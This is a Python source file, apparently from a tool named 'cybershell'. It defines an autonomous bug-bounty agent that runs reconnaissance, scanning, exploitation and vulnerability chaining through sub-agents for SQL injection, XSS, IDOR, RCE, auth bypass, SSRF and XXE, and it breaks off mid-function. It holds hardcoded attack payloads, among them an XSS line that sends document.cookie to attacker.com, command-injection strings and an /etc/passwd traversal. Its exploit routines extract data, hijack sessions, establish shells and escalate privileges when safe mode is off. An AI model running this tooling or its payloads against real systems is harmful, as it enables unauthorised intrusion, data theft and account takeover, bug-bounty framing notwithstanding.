from dataclasses import dataclass, field
from typing import Dict, Any, Optional, List
from enum import Enum
import json
import uuid
from pathlib import Path
from datetime import datetime, timezone
import concurrent.futures
from cybershell.unified_config import BountyConfig

class ExploitPhase(Enum):
    RECON = "reconnaissance"
    DISCOVERY = "vulnerability_discovery"
    EXPLOITATION = "active_exploitation"
    ESCALATION = "privilege_escalation"
    IMPACT = "proof_of_impact"
    REPORTING = "report_generation"

@dataclass
class VulnerabilityFinding:
    vuln_type: str
    severity: str  # Critical/High/Medium/Low
    endpoint: str
    evidence: Dict[str, Any]
    proof_of_impact: Optional[str] = None
    cvss_score: Optional[float] = None
    cwe_id: Optional[str] = None
    remediation: Optional[str] = None
    reproducible: bool = False

@dataclass
class ExploitationStrategy:
    """Defines how to approach a specific vulnerability class"""
    vuln_class: str
    techniques: List[str]
    payloads: List[str]
    evidence_requirements: List[str]
    impact_demonstration: str

class AutonomousBountyHunter:
    """
    Main autonomous agent for bug bounty hunting
    Manages multiple sub-agents for different vulnerability classes
    Now with fingerprinting and intelligent payload selection
    """
    
    def __init__(self, config: BountyConfig, bot, run_dir: str = "bounty_runs"):
        self.config = config
        self.bot = bot
        self.run_dir = Path(run_dir)
        self.run_dir.mkdir(parents=True, exist_ok=True)
    
        self.findings: List[VulnerabilityFinding] = []
        self.run_id = uuid.uuid4().hex[:12]
        self.start_time = datetime.now()
    
        # Initialize exploitation strategies
        self.strategies = self._init_exploitation_strategies()
    
        # Initialize fingerprinting and payload management
        try:
            from .fingerprinter import Fingerprinter
            from .vulnerability_kb import VulnerabilityKnowledgeBase
            from .payload_manager import PayloadManager
        
            self.fingerprinter = Fingerprinter()
            kb = VulnerabilityKnowledgeBase()
            self.payload_manager = PayloadManager(kb)
        except ImportError as e:
            print(f"[WARNING] Optional components not available: {e}")
            self.fingerprinter = None
            self.payload_manager = None
    
        # Sub-agents for parallel exploitation
        self.sub_agents = {
            'sqli': SQLInjectionAgent(self.bot),
            'xss': XSSAgent(self.bot),
            'idor': IDORAgent(self.bot),
            'rce': RCEAgent(self.bot),
            'auth': AuthBypassAgent(self.bot),
            'logic': BusinessLogicAgent(self.bot),
            'ssrf': SSRFAgent(self.bot),
            'xxe': XXEAgent(self.bot),
            'ssti': SSTIAgent(self.bot),
        }
        
    def _init_exploitation_strategies(self) -> Dict[str, ExploitationStrategy]:
        """Define exploitation strategies for each vulnerability class"""
        return {
            'sqli': ExploitationStrategy(
                vuln_class='SQL Injection',
                techniques=['error_based', 'union_based', 'blind_boolean', 'time_based'],
                payloads=["' OR '1'='1", "1' AND extractvalue(1,concat(0x7e,database()))", 
                         "1' UNION SELECT NULL,@@version,NULL--"],
                evidence_requirements=['database_version', 'table_names', 'sample_data'],
                impact_demonstration='data_extraction'
            ),
            'xss': ExploitationStrategy(
                vuln_class='Cross-Site Scripting',
                techniques=['reflected', 'stored', 'dom_based', 'mutation'],
                payloads=['<img src=x onerror=alert(document.domain)>',
                         '<svg onload=fetch(`//attacker.com/${document.cookie}`)>'],
                evidence_requirements=['execution_screenshot', 'dom_modification', 'cookie_access'],
                impact_demonstration='session_hijacking'
            ),
            'rce': ExploitationStrategy(
                vuln_class='Remote Code Execution',
                techniques=['command_injection', 'deserialization', 'file_upload', 'template_injection'],
                payloads=['; whoami', '${7*7}', '__import__("os").system("id")'],
                evidence_requirements=['command_output', 'system_info', 'file_creation'],
                impact_demonstration='full_system_control'
            ),
            'idor': ExploitationStrategy(
                vuln_class='Insecure Direct Object Reference',
                techniques=['parameter_manipulation', 'uuid_bruteforce', 'path_traversal'],
                payloads=['../../../etc/passwd', 'user_id=1', 'account=admin'],
                evidence_requirements=['unauthorized_data', 'privilege_escalation', 'data_modification'],
                impact_demonstration='unauthorized_access'
            )
        }
    
    def hunt(self, target: str) -> Dict[str, Any]:
        """
        Main hunting loop - coordinates all phases of bug bounty hunting
        """
        print(f"[*] Starting autonomous hunt on {target}")
        print(f"[*] Run ID: {self.run_id}")
        
        results = {
            'run_id': self.run_id,
            'target': target,
            'phases': {},
            'findings': [],
            'total_bounty_estimate': 0,
            'fingerprint': None  # NEW
        }
        
        # NEW: Fingerprint target if fingerprinter available
        if self.fingerprinter:
            print("[FINGERPRINT] Fingerprinting target...")
            fingerprint = self.fingerprinter.fingerprint(target, aggressive=False)
            results['fingerprint'] = {
                'product': fingerprint.product,
                'version': fingerprint.version,
                'technologies': fingerprint.technologies,
                'server': fingerprint.server,
                'waf': fingerprint.waf
            }
            print(f"[FINGERPRINT] Detected: {fingerprint.product} {fingerprint.version or 'unknown'}")
        
        # Phase 1: Reconnaissance
        recon_results = self._phase_recon(target)
        results['phases']['recon'] = recon_results
        
        # Phase 2: Vulnerability Discovery (parallel)
        discovery_results = self._phase_discovery(target, recon_results)
        results['phases']['discovery'] = discovery_results
        
        # Phase 3: Active Exploitation (parallel with safety checks)
        exploit_results = self._phase_exploitation(discovery_results)
        results['phases']['exploitation'] = exploit_results
        
        # Phase 4: Privilege Escalation & Chaining
        if self.config.chain_vulnerabilities:
            chain_results = self._phase_chain_exploits(exploit_results)
            results['phases']['chaining'] = chain_results
        
        # Phase 5: Proof of Impact Collection
        impact_results = self._phase_impact_demonstration(exploit_results)
        results['phases']['impact'] = impact_results
        
        # Phase 6: Report Generation
        report = self._phase_generate_report(impact_results)
        results['report'] = report
        
        # Calculate bounty estimates
        results['total_bounty_estimate'] = self._estimate_bounty(self.findings)
        results['findings'] = [f.__dict__ for f in self.findings]
        
        # Save results
        self._save_results(results)
        
        return results
    
    def _phase_recon(self, target: str) -> Dict[str, Any]:
        """Reconnaissance phase - gather attack surface"""
        print(f"[RECON] Mapping attack surface for {target}")
        
        recon_plan = [
            ('HttpFingerprintPlugin', {'target': target}),
            ('FormDiscoveryPlugin', {'target': target}),
            ('JSAnalyzerPlugin', {'target': target}),
            ('APIDiscoveryPlugin', {'target': target}),
            ('SubdomainEnumerationPlugin', {'target': target}),
            ('TechnologyStackPlugin', {'target': target}),
        ]
        
        recon_data = {
            'endpoints': [],
            'forms': [],
            'apis': [],
            'technologies': [],
            'subdomains': [],
            'parameters': set(),
            'headers': {},
        }
        
        # Execute recon plugins
        for plugin_name, params in recon_plan:
            result = self.bot.execute_plugin(plugin_name, params)
            if result.success:
                self._process_recon_result(result, recon_data)
        
        # LLM-assisted attack surface analysis
        if self.bot.llm:
            attack_vectors = self.bot.llm.analyze_attack_surface(recon_data)
            recon_data['llm_suggested_vectors'] = attack_vectors
        
        return recon_data
    
    def _phase_discovery(self, target: str, recon: Dict) -> Dict[str, Any]:
        """Vulnerability discovery phase - identify potential vulnerabilities"""
        print(f"[DISCOVERY] Scanning for vulnerabilities")
        
        discovery_tasks = []
        
        # Generate test cases based on recon
        for endpoint in recon.get('endpoints', []):
            for strategy_name, strategy in self.strategies.items():
                task = {
                    'endpoint': endpoint,
                    'strategy': strategy,
                    'agent': self.sub_agents.get(strategy_name.split('_')[0])
                }
                discovery_tasks.append(task)
        
        # Parallel vulnerability scanning
        potential_vulns = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.max_parallel_exploits) as executor:
            futures = []
            for task in discovery_tasks:
                if task['agent']:
                    future = executor.submit(
                        task['agent'].scan,
                        task['endpoint'],
                        task['strategy']
                    )
                    futures.append((future, task))
            
            for future, task in futures:
                try:
                    result = future.result(timeout=30)
                    if result and result.get('confidence', 0) > self.config.confidence_threshold:
                        potential_vulns.append(result)
                except Exception as e:
                    print(f"[!] Discovery error: {e}")
        
        return {'potential_vulnerabilities': potential_vulns}
    
    def _phase_exploitation(self, discovery: Dict) -> Dict[str, Any]:
        """Active exploitation phase - confirm and exploit vulnerabilities"""
        print(f"[EXPLOIT] Exploiting confirmed vulnerabilities")
        
        exploited = []
        
        for vuln in discovery.get('potential_vulnerabilities', []):
            # Check if vulnerability meets exploitation criteria
            if not self._should_exploit(vuln):
                continue
            
            agent = self.sub_agents.get(vuln['type'])
            if not agent:
                continue
            
            try:
                # NEW: Select optimal payloads using PayloadManager if available
                selected_payloads = []
                if self.payload_manager and self.fingerprinter:
                    # Get fingerprint for target
                    target_url = vuln.get('endpoint', '')
                    if target_url:
                        fingerprint = self.fingerprinter.fingerprint(target_url, aggressive=False)
                        
                        # Map vuln type to category
                        vuln_category_map = {
                            'sqli': 'SQLI',
                            'xss': 'XSS',
                            'ssrf': 'SSRF',
                            'rce': 'RCE',
                            'xxe': 'XXE',
                            'ssti': 'RCE',
                            'idor': 'IDOR',
                            'auth_bypass': 'AUTH_BYPASS',
                            'business_logic': 'BUSINESS_LOGIC'
                        }
                        
                        if vuln['type'] in vuln_category_map:
                            from cybershell.vulnerability_kb import VulnCategory
                            vuln_cat = VulnCategory[vuln_category_map[vuln['type']]]
                            
                            # Get context for payload selection
                            endpoint_context = {
                                'endpoint_type': 'api' if 'api' in target_url else 'web',
                                'injection_context': vuln.get('context', 'parameter'),
                                'previous_responses': vuln.get('responses', [])
                            }
                            
                            # Select payloads
                            ranked_payloads = self.payload_manager.select_payloads(
                                fingerprint=fingerprint,
                                vulnerability=vuln_cat,
                                context=endpoint_context,
                                top_n=5
                            )
                            
                            selected_payloads = [rp.payload for rp in ranked_payloads]
                            
                            if selected_payloads:
                                print(f"[PAYLOAD] Selected {len(selected_payloads)} targeted payloads for {fingerprint.product or 'unknown'} {fingerprint.version or ''}")
                
                # Exploit with proof of concept
                exploit_result = agent.exploit(
                    vuln,
                    collect_evidence=True,
                    safe_mode=not self.config.aggressive_mode,
                    exploit_payloads=selected_payloads if selected_payloads else None  # NEW: Pass selected payloads
                )
                
                if exploit_result['success']:
                    # Create finding
                    finding = VulnerabilityFinding(
                        vuln_type=vuln['type'],
                        severity=self._calculate_severity(exploit_result),
                        endpoint=vuln['endpoint'],
                        evidence=exploit_result['evidence'],
                        proof_of_impact=exploit_result.get('impact_proof'),
                        reproducible=True
                    )
                    
                    self.findings.append(finding)
                    exploited.append(exploit_result)
                    
                    print(f"[+] Exploited {vuln['type']} at {vuln['endpoint']}")
                    
                    # NEW: Update payload manager with success
                    if self.payload_manager and exploit_result.get('payload_used'):
                        self.payload_manager.update_history(
                            exploit_result['payload_used'],
                            success=True
                        )
                    
            except Exception as e:
                print(f"[!] Exploitation failed: {e}")
                
                # NEW: Update payload manager with failure if applicable
                if self.payload_manager and selected_payloads:
                    for payload in selected_payloads:
                        self.payload_manager.update_history(payload, success=False)
        
        return {'exploited_vulnerabilities': exploited}
    
    def _phase_chain_exploits(self, exploits: Dict) -> Dict[str, Any]:
        """Chain multiple vulnerabilities for maximum impact"""
        print(f"[CHAIN] Attempting vulnerability chaining")
        
        chains = []
        vulns = exploits.get('exploited_vulnerabilities', [])
        
        # Look for chainable vulnerabilities
        for i, vuln1 in enumerate(vulns):
            for vuln2 in vulns[i+1:]:
                if self._can_chain(vuln1, vuln2):
                    chain_result = self._execute_chain(vuln1, vuln2)
                    if chain_result['success']:
                        chains.append(chain_result)
                        print(f"[+] Successful chain: {vuln1['type']} -> {vuln2['type']}")
        
        return {'exploit_chains': chains}
    
    def _phase_impact_demonstration(self, exploits: Dict) -> Dict[str, Any]:
        """Demonstrate real impact for bug bounty proof"""
        print(f"[IMPACT] Collecting proof of impact")
        
        impacts = []
        
        for exploit in exploits.get('exploited_vulnerabilities', []):
            impact = {
                'vulnerability': exploit['type'],
                'endpoint': exploit['endpoint'],
                'proof': {}
            }
            
            # Collect impact based on vulnerability type
            if exploit['type'] == 'sqli':
                impact['proof'] = self._demonstrate_data_breach(exploit)
            elif exploit['type'] == 'xss':
                impact['proof'] = self._demonstrate_account_takeover(exploit)
            elif exploit['type'] == 'rce':
                impact['proof'] = self._demonstrate_system_compromise(exploit)
            elif exploit['type'] == 'idor':
                impact['proof'] = self._demonstrate_unauthorized_access(exploit)
            
            impacts.append(impact)
        
        return {'impact_demonstrations': impacts}
    
    def _phase_generate_report(self, impacts: Dict) -> str:
        """Generate professional bug bounty report"""
        print(f"[REPORT] Generating bug bounty report")
        
        report = f"""
# Bug Bounty Report - {self.config.target_domain}
## Executive Summary
Run ID: {self.run_id}
Date: {datetime.now().isoformat()}
Total Findings: {len(self.findings)}
Critical: {sum(1 for f in self.findings if f.severity == 'Critical')}
High: {sum(1 for f in self.findings if f.severity == 'High')}

## Findings

"""
        for i, finding in enumerate(self.findings, 1):
            report += f"""
### Finding #{i}: {finding.vuln_type}
**Severity:** {finding.severity}
**Endpoint:** {finding.endpoint}
**CVSS Score:** {finding.cvss_score or 'N/A'}
**CWE:** {finding.cwe_id or 'N/A'}

#### Proof of Concept
```
{json.dumps(finding.evidence, indent=2)}
```

#### Impact
{finding.proof_of_impact or 'See evidence above'}

#### Remediation
{finding.remediation or 'Standard remediation for ' + finding.vuln_type}

---
"""
        
        # Save report
        report_path = self.run_dir / f"report_{self.run_id}.md"
        report_path.write_text(report)
        
        return report
    
    def _should_exploit(self, vuln: Dict) -> bool:
        """Determine if vulnerability should be exploited"""
        # Check scope
        if not self._in_scope(vuln.get('endpoint', '')):
            return False
        
        # Check severity threshold
        cvss = vuln.get('cvss_score', 0)
        if cvss < self.config.min_cvss_for_exploit:
            return False
        
        # Check confidence
        if vuln.get('confidence', 0) < self.config.confidence_threshold:
            return False
        
        return True
    
    def _in_scope(self, endpoint: str) -> bool:
        """Check if endpoint is in scope"""
        for scope in self.config.scope:
            if scope in endpoint:
                for out in self.config.out_of_scope:
                    if out in endpoint:
                        return False
                return True
        return False
    
    def _calculate_severity(self, exploit_result: Dict) -> str:
        """Calculate severity based on impact"""
        impact = exploit_result.get('impact_score', 0)
        if impact >= 9.0:
            return 'Critical'
        elif impact >= 7.0:
            return 'High'
        elif impact >= 4.0:
            return 'Medium'
        return 'Low'
    
    def _can_chain(self, vuln1: Dict, vuln2: Dict) -> bool:
        """Check if two vulnerabilities can be chained"""
        # Chain logic examples
        chains = [
            ('xss', 'csrf'),  # XSS to CSRF
            ('sqli', 'rce'),  # SQLi to RCE via INTO OUTFILE
            ('idor', 'privilege_escalation'),  # IDOR to admin access
            ('xxe', 'ssrf'),  # XXE to SSRF
        ]
        
        for chain in chains:
            if vuln1['type'] == chain[0] and vuln2['type'] == chain[1]:
                return True
            if vuln1['type'] == chain[1] and vuln2['type'] == chain[0]:
                return True
        
        return False
    
    def _execute_chain(self, vuln1: Dict, vuln2: Dict) -> Dict:
        """Execute vulnerability chain"""
        # Implementation depends on specific chain
        return {
            'success': True,
            'chain': f"{vuln1['type']} -> {vuln2['type']}",
            'impact_multiplier': 2.0
        }
    
    def _demonstrate_data_breach(self, exploit: Dict) -> Dict:
        """Demonstrate data breach impact for SQLi"""
        return {
            'extracted_tables': exploit.get('evidence', {}).get('tables', []),
            'row_count': exploit.get('evidence', {}).get('rows', 0),
            'sensitive_columns': ['password', 'email', 'ssn', 'credit_card'],
            'screenshot': 'data_extraction.png'
        }
    
    def _demonstrate_account_takeover(self, exploit: Dict) -> Dict:
        """Demonstrate account takeover via XSS"""
        return {
            'stolen_session': exploit.get('evidence', {}).get('session', ''),
            'admin_access': exploit.get('evidence', {}).get('admin', False),
            'modified_content': True,
            'screenshot': 'account_takeover.png'
        }
    
    def _demonstrate_system_compromise(self, exploit: Dict) -> Dict:
        """Demonstrate system compromise via RCE"""
        return {
            'command_execution': exploit.get('evidence', {}).get('commands', []),
            'file_access': exploit.get('evidence', {}).get('files', []),
            'system_info': exploit.get('evidence', {}).get('system', {}),
            'screenshot': 'shell_access.png'
        }
    
    def _demonstrate_unauthorized_access(self, exploit: Dict) -> Dict:
        """Demonstrate unauthorized access via IDOR"""
        return {
            'accessed_resources': exploit.get('evidence', {}).get('resources', []),
            'privilege_level': exploit.get('evidence', {}).get('privilege', 'user'),
            'data_modified': exploit.get('evidence', {}).get('modified', False),
            'screenshot': 'unauthorized_access.png'
        }
    
    def _estimate_bounty(self, findings: List[VulnerabilityFinding]) -> int:
        """Estimate bug bounty reward based on findings"""
        bounty_rates = {
            'Critical': 5000,
            'High': 2000,
            'Medium': 500,
            'Low': 100
        }
        
        total = 0
        for finding in findings:
            base = bounty_rates.get(finding.severity, 0)
            
            # Bonus for chained exploits
            if 'chain' in str(finding.evidence):
                base *= 1.5
            
            # Bonus for novel techniques
            if finding.evidence.get('novel_technique'):
                base *= 1.25
                
            total += base
        
        return int(total)
    
    def _save_results(self, results: Dict):
        """Save hunt results"""
        output_file = self.run_dir / f"hunt_{self.run_id}.json"
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        print(f"[*] Results saved to {output_file}")
    
    def _process_recon_result(self, result, recon_data: Dict):
        """Process reconnaissance plugin results"""
        details = result.details
        
        if 'endpoints' in details:
            recon_data['endpoints'].extend(details['endpoints'])
        if 'forms' in details:
            recon_data['forms'].extend(details['forms'])
        if 'parameters' in details:
            recon_data['parameters'].update(details['parameters'])
        if 'headers' in details:
            recon_data['headers'].update(details['headers'])


# Sub-agents for specific vulnerability classes

class SQLInjectionAgent:
    """Specialized agent for SQL injection exploitation"""
    
    def __init__(self, bot):
        self.bot = bot
        
    def scan(self, endpoint: str, strategy: ExploitationStrategy) -> Dict:
        """Scan for SQL injection vulnerabilities"""
        result = {
            'type': 'sqli',
            'endpoint': endpoint,
            'confidence': 0.0,
            'injectable_params': []
        }
        
        # Test each payload
        for payload in strategy.payloads:
            response = self.bot.execute_plugin('SQLiTestPlugin', {
                'target': endpoint,
                'payload': payload
            })
            
            if response.success and response.details.get('vulnerable'):
                result['confidence'] = max(result['confidence'], 0.9)
                result['injectable_params'].append(response.details.get('parameter'))
        
        return result if result['confidence'] > 0 else None
    
    def exploit(self, vuln: Dict, collect_evidence: bool = True, safe_mode: bool = False, 
                exploit_payloads: Optional[List] = None) -> Dict:
        """Exploit SQL injection with evidence collection"""
        exploit_result = {
            'success': False,
            'type': 'sqli',
            'endpoint': vuln['endpoint'],
            'evidence': {},
            'impact_proof': None,
            'payload_used': None  # Track which payload worked
        }
        
        # Use provided payloads or fall back to default
        if exploit_payloads:
            # Try each payload in order of ranking
            for payload_obj in exploit_payloads:
                response = self.bot.execute_plugin('SQLiExploitPlugin', {
                    'target': vuln['endpoint'],
                    'params': vuln['injectable_params'],
                    'payload': payload_obj.payload.payload,  # Use specific payload
                    'extract_data': not safe_mode,
                    'enumerate_db': True
                })
                
                if response.success:
                    exploit_result['success'] = True
                    exploit_result['evidence'] = response.details
                    exploit_result['impact_proof'] = f"Extracted {response.details.get('rows', 0)} rows from database"
                    exploit_result['impact_score'] = 8.5
                    exploit_result['payload_used'] = payload_obj  # Track successful payload
                    break
        else:
            # Fallback to default exploitation
            response = self.bot.execute_plugin('SQLiExploitPlugin', {
                'target': vuln['endpoint'],
                'params': vuln['injectable_params'],
                'extract_data': not safe_mode,
                'enumerate_db': True
            })
            
            if response.success:
                exploit_result['success'] = True
                exploit_result['evidence'] = response.details
                exploit_result['impact_proof'] = f"Extracted {response.details.get('rows', 0)} rows from database"
                exploit_result['impact_score'] = 8.5
        
        return exploit_result


class XSSAgent:
    """Specialized agent for XSS exploitation"""
    
    def __init__(self, bot):
        self.bot = bot
        
    def scan(self, endpoint: str, strategy: ExploitationStrategy) -> Dict:
        """Scan for XSS vulnerabilities"""
        result = {
            'type': 'xss',
            'endpoint': endpoint,
            'confidence': 0.0,
            'contexts': []
        }
        
        for payload in strategy.payloads:
            response = self.bot.execute_plugin('XSSTestPlugin', {
                'target': endpoint,
                'payload': payload
            })
            
            if response.success and response.details.get('reflected'):
                result['confidence'] = max(result['confidence'], 0.85)
                result['contexts'].append(response.details.get('context'))
        
        return result if result['confidence'] > 0 else None
    
    def exploit(self, vuln: Dict, collect_evidence: bool = True, safe_mode: bool = False,
                exploit_payloads: Optional[List] = None) -> Dict:
        """Exploit XSS with session hijacking proof"""
        exploit_result = {
            'success': False,
            'type': 'xss',
            'endpoint': vuln['endpoint'],
            'evidence': {},
            'impact_proof': None,
            'payload_used': None
        }
        
        if exploit_payloads:
            for payload_obj in exploit_payloads:
                response = self.bot.execute_plugin('XSSExploitPlugin', {
                    'target': vuln['endpoint'],
                    'contexts': vuln['contexts'],
                    'payload': payload_obj.payload.payload,
                    'steal_session': not safe_mode,
                    'screenshot': True
                })
                
                if response.success:
                    exploit_result['success'] = True
                    exploit_result['evidence'] = response.details
                    exploit_result['impact_proof'] = "Demonstrated session hijacking capability"
                    exploit_result['impact_score'] = 7.5
                    exploit_result['payload_used'] = payload_obj
                    break
        else:
            response = self.bot.execute_plugin('XSSExploitPlugin', {
                'target': vuln['endpoint'],
                'contexts': vuln['contexts'],
                'steal_session': not safe_mode,
                'screenshot': True
            })
            
            if response.success:
                exploit_result['success'] = True
                exploit_result['evidence'] = response.details
                exploit_result['impact_proof'] = "Demonstrated session hijacking capability"
                exploit_result['impact_score'] = 7.5
        
        return exploit_result


class IDORAgent:
    """Specialized agent for IDOR exploitation"""
    
    def __init__(self, bot):
        self.bot = bot
        
    def scan(self, endpoint: str, strategy: ExploitationStrategy) -> Dict:
        """Scan for IDOR vulnerabilities"""
        result = {
            'type': 'idor',
            'endpoint': endpoint,
            'confidence': 0.0,
            'accessible_objects': []
        }
        
        response = self.bot.execute_plugin('IDORTestPlugin', {
            'target': endpoint,
            'object_manipulation': True,
            'test_authorization': True
        })
        
        if response.success and response.details.get('unauthorized_access'):
            result['confidence'] = 0.95
            result['accessible_objects'] = response.details.get('objects', [])
        
        return result if result['confidence'] > 0 else None
    
    def exploit(self, vuln: Dict, collect_evidence: bool = True, safe_mode: bool = False,
                exploit_payloads: Optional[List] = None) -> Dict:
        """Exploit IDOR with data access proof"""
        exploit_result = {
            'success': False,
            'type': 'idor',
            'endpoint': vuln['endpoint'],
            'evidence': {},
            'impact_proof': None,
            'payload_used': None
        }
        
        response = self.bot.execute_plugin('IDORExploitPlugin', {
            'target': vuln['endpoint'],
            'objects': vuln['accessible_objects'],
            'extract_sensitive': not safe_mode,
            'modify_data': False  # Don't modify in production
        })
        
        if response.success:
            exploit_result['success'] = True
            exploit_result['evidence'] = response.details
            exploit_result['impact_proof'] = f"Accessed {len(response.details.get('data', []))} unauthorized records"
            exploit_result['impact_score'] = 7.0
        
        return exploit_result


class RCEAgent:
    """Specialized agent for RCE exploitation"""
    
    def __init__(self, bot):
        self.bot = bot
        
    def scan(self, endpoint: str, strategy: ExploitationStrategy) -> Dict:
        """Scan for RCE vulnerabilities"""
        result = {
            'type': 'rce',
            'endpoint': endpoint,
            'confidence': 0.0,
            'vectors': []
        }
        
        for payload in strategy.payloads:
            response = self.bot.execute_plugin('RCETestPlugin', {
                'target': endpoint,
                'payload': payload,
                'safe_commands_only': True
            })
            
            if response.success and response.details.get('execution_confirmed'):
                result['confidence'] = 1.0  # RCE is critical
                result['vectors'].append(response.details.get('vector'))
        
        return result if result['confidence'] > 0 else None
    
    def exploit(self, vuln: Dict, collect_evidence: bool = True, safe_mode: bool = False,
                exploit_payloads: Optional[List] = None) -> Dict:
        """Exploit RCE with system access proof"""
        exploit_result = {
            'success': False,
            'type': 'rce',
            'endpoint': vuln['endpoint'],
            'evidence': {},
            'impact_proof': None,
            'payload_used': None
        }
        
        if exploit_payloads:
            for payload_obj in exploit_payloads:
                response = self.bot.execute_plugin('RCEExploitPlugin', {
                    'target': vuln['endpoint'],
                    'vectors': vuln['vectors'],
                    'payload': payload_obj.payload.payload,
                    'establish_shell': not safe_mode,
                    'system_enumeration': True,
                    'safe_demonstration': safe_mode
                })
                
                if response.success:
                    exploit_result['success'] = True
                    exploit_result['evidence'] = response.details
                    exploit_result['impact_proof'] = "Full system compromise achieved"
                    exploit_result['impact_score'] = 10.0
                    exploit_result['payload_used'] = payload_obj
                    break
        else:
            response = self.bot.execute_plugin('RCEExploitPlugin', {
                'target': vuln['endpoint'],
                'vectors': vuln['vectors'],
                'establish_shell': not safe_mode,
                'system_enumeration': True,
                'safe_demonstration': safe_mode
            })
            
            if response.success:
                exploit_result['success'] = True
                exploit_result['evidence'] = response.details
                exploit_result['impact_proof'] = "Full system compromise achieved"
                exploit_result['impact_score'] = 10.0
        
        return exploit_result


class AuthBypassAgent:
    """Specialized agent for authentication bypass"""
    
    def __init__(self, bot):
        self.bot = bot
        
    def scan(self, endpoint: str, strategy: ExploitationStrategy) -> Dict:
        """Scan for authentication bypass vulnerabilities"""
        result = {
            'type': 'auth_bypass',
            'endpoint': endpoint,
            'confidence': 0.0,
            'methods': []
        }
        
        response = self.bot.execute_plugin('AuthBypassTestPlugin', {
            'target': endpoint,
            'test_jwt': True,
            'test_session': True,
            'test_oauth': True
        })
        
        if response.success and response.details.get('bypass_possible'):
            result['confidence'] = 0.9
            result['methods'] = response.details.get('methods', [])
        
        return result if result['confidence'] > 0 else None
    
    def exploit(self, vuln: Dict, collect_evidence: bool = True, safe_mode: bool = False,
                exploit_payloads: Optional[List] = None) -> Dict:
        """Exploit authentication bypass"""
        exploit_result = {
            'success': False,
            'type': 'auth_bypass',
            'endpoint': vuln['endpoint'],
            'evidence': {},
            'impact_proof': None,
            'payload_used': None
        }
        
        response = self.bot.execute_plugin('AuthBypassExploitPlugin', {
            'target': vuln['endpoint'],
            'methods': vuln['methods'],
            'escalate_privileges': not safe_mode
        })
        
        if response.success:
            exploit_result['success'] = True
            exploit_result['evidence'] = response.details
            exploit_result['impact_proof'] = "Achieved unauthorized admin access"
            exploit_result['impact_score'] = 9.0
        
        return exploit_result


class BusinessLogicAgent:
    """Specialized agent for business logic flaws"""
    
    def __init__(self, bot):
        self.bot = bot
        
    def scan(self, endpoint: str, strategy: ExploitationStrategy) -> Dict:
        """Scan for business logic vulnerabilities"""
        result = {
            'type': 'business_logic',
            'endpoint': endpoint,
            'confidence': 0.0,
            'flaws': []
        }
        
        response = self.bot.execute_plugin('BusinessLogicTestPlugin', {
            'target': endpoint,
            'test_race_conditions': True,
            'test_price_manipulation': True,
            'test_workflow_bypass': True
        })
        
        if response.success and response.details.get('flaw_detected'):
            result['confidence'] = 0.8
            result['flaws'] = response.details.get('flaws', [])
        
        return result if result['confidence'] > 0 else None
    
    def exploit(self, vuln: Dict, collect_evidence: bool = True, safe_mode: bool = False,
                exploit_payloads: Optional[List] = None) -> Dict:
        """Exploit business logic flaws"""
        exploit_result = {
            'success': False,
            'type': 'business_logic',
            'endpoint': vuln['endpoint'],
            'evidence': {},
            'impact_proof': None,
            'payload_used': None
        }
        
        response = self.bot.execute_plugin('BusinessLogicExploitPlugin', {
            'target': vuln['endpoint'],
            'flaws': vuln['flaws'],
            'demonstrate_impact': True
        })
        
        if response.success:
            exploit_result['success'] = True
            exploit_result['evidence'] = response.details
            exploit_result['impact_proof'] = response.details.get('financial_impact', 'Logic flaw exploited')
            exploit_result['impact_score'] = 6.5
        
        return exploit_result


class SSRFAgent:
    """Specialized agent for SSRF exploitation"""
    
    def __init__(self, bot):
        self.bot = bot
        
    def scan(self, endpoint: str, strategy: ExploitationStrategy) -> Dict:
        """Scan for SSRF vulnerabilities"""
        result = {
            'type': 'ssrf',
            'endpoint': endpoint,
            'confidence': 0.0,
            'vulnerable_params': []
        }
        
        response = self.bot.execute_plugin('SSRFTestPlugin', {
            'target': endpoint,
            'test_internal': True,
            'test_cloud_metadata': True
        })
        
        if response.success and response.details.get('ssrf_confirmed'):
            result['confidence'] = 0.85
            result['vulnerable_params'] = response.details.get('parameters', [])
        
        return result if result['confidence'] > 0 else None
    
    def exploit(self, vuln: Dict, collect_evidence: bool = True, safe_mode: bool = False,
                exploit_payloads: Optional[List] = None) -> Dict:
        """Exploit SSRF to access internal resources"""
        exploit_result = {
            'success': False,
            'type': 'ssrf',
            'endpoint': vuln['endpoint'],
            'evidence': {},
            'impact_proof': None,
            'payload_used': None
        }
        
        if exploit_payloads:
            for payload_obj in exploit_payloads:
                response = self.bot.execute_plugin('SSRFExploitPlugin', {
                    'target': vuln['endpoint'],
                    'params': vuln['vulnerable_params'],
                    'payload': payload_obj.payload.payload,
                    'access_metadata': not safe_mode,
                    'scan_internal': True
                })
                
                if response.success:
                    exploit_result['success'] = True
                    exploit_result['evidence'] = response.details
                    exploit_result['impact_proof'] = "Accessed internal network resources"
                    exploit_result['impact_score'] = 8.0
                    exploit_result['payload_used'] = payload_obj
                    break
        else:
            response = self.bot.execute_plugin('SSRFExploitPlugin', {
                'target': vuln['endpoint'],
                'params': vuln['vulnerable_params'],
                'access_metadata': not safe_mode,
                'scan_internal': True
            })
            
            if response.success:
                exploit_result['success'] = True
                exploit_result['evidence'] = response.details
                exploit_result['impact_proof'] = "Accessed internal network resources"
                exploit_result['impact_score'] = 8.0
        
        return exploit_result


class XXEAgent:
    """Specialized agent for XXE exploitation"""
    
    def __init__(self, bot):
        self.bot = bot
        
    def scan(self, endpoint: str, strategy: ExploitationStrategy) -> Dict:
        """Scan for XXE vulnerabilities"""
        result = {
            'type': 'xxe',
            'endpoint': endpoint,
            'confidence': 0.0,
            'parsers': []
        }
        
        response = self.bot.execute_plugin('XXETestPlugin', {
            'target': endpoint,
            'test_file_disclosure': True,
            'test_ssrf': True
        })
        
        if response.success and response.details.get('xxe_possible'):
            result['confidence'] = 0.9
            result['parsers'] = response.details.get('vulnerable_parsers', [])
        
        return result if result['confidence'] > 0 else None
    
    def exploit(self, vuln: Dict, collect_evidence: bool = True, safe_mode: bool = False,
                exploit_payloads: Optional[List] = None) -> Dict:
        """Exploit XXE for file disclosure"""
        exploit_result = {
            'success': False,
            'type': 'xxe',
            'endpoint': vuln['endpoint'],
            'evidence': {},
            'impact_proof': None,
            'payload_used': None
        }
        
        if exploit_payloads:
            for payload_obj in exploit_payloads:
                response = self.bot.execute_plugin('XXEExploitPlugin', {
                    'target': vuln['endpoint'],
                    'parsers': vuln['parsers'],
                    'payload': payload_obj.payload.payload,
                    'extract_files': not safe_mode,
